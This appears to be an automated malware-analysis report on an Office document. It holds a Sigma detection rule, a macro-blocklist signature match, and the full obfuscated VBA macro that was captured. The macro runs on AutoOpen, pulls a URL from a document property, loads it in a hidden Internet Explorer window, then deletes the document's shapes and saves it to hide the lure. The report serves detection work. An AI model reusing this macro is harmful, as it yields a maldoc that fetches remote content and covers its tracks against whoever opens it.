sigma_analysis_results.rule_title: Suspicious New Instance Of An Office COM Object
sigma_analysis_results.rule_description:
Detects an svchost process spawning an instance of an office application. This happens when the initial word application creates an instance of one of the Office COM objects such as 'Word.Application', 'Excel.Application', etc.
This can be used by malicious actors to create malicious Office documents with macros on the fly. (See vba2clr project in the references)

signature_matches.name: Macro blocklist
signature_matches.description: CreateObject
match_data:
Attribute VB_Name = "Module1"
Function kMqHCJ(NYvZK As Single)
Dim rqEYUHpex As Single
rqEYUHpex = Timer + NYvZK
While Timer < rqEYUHpex
DoEvents
Wend
End Function
Function DFCfPg() As String
DFCfPg = ActiveDocument.BuiltInDocumentProperties("Company").Value
Function oKBFii()
Dim ImdABv As Object
Set ImdABv = CreateObject("InternetExplorer.Application")
ImdABv.Navigate DFCfPg()
ImdABv.Toolbar = False
ImdABv.StatusBar = False
ImdABv.MenuBar = False
Do While ImdABv.Busy: DoEvents: Loop
kMqHCJ ActiveDocument.BuiltInDocumentProperties("Comments").Value
ImdABv.Quit
Function brxhFz()
Do While ActiveDocument.Shapes.Count > 0
ActiveDocument.Shapes(1).Delete
Loop
Function HrefMVFh()
ActiveDocument.Save
ActiveDocument.Saved = True
Function BieqZ()
oKBFii
brxhFz
HrefMVFh
Sub AutoOpen()
BieqZ
End Sub
